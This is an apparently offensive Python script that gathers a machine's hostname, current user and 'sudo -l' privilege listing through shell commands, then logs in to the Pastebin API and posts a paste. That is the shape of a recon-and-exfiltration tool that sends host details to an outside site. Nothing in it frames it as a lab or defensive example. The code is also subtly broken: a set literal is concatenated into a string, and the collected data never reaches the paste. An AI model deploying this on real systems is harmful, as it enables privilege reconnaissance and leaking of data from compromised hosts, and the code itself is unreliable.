import subprocess
import base64
import requests
import sys

hostname = subprocess.Popen('hostname', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = hostname.communicate()
hostname = stdout.decode()

user = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = user.communicate()
user= stdout.decode()

privilege = subprocess.Popen('sudo -l', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = privilege.communicate()
privilege = stdout.decode()

result = "Hostname : "+hostname+"\nUser : "+user+"\nPrivilege : "+{privilege}

key = 'dev_key'
text = "text"
title = "pastebin_title"
 
login_data = {
    'api_dev_key': key,
    'api_user_name': 'username',
    'api_user_password': 'password'
    }
data = {
    'api_option': 'paste',
    'api_dev_key':key,
    'api_paste_code':text,
    'api_paste_name':title,
    'api_user_key': None
    }
 
login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
print("User token: ", login.text)
data['api_user_key'] = login.text
 
r = requests.post("https://pastebin.com/api/api_post.php", data=data)
print("Paste send: ", r.status_code if r.status_code != 200 else "OK/200")
print("Paste URL: ", r.text)
 
 
 
 
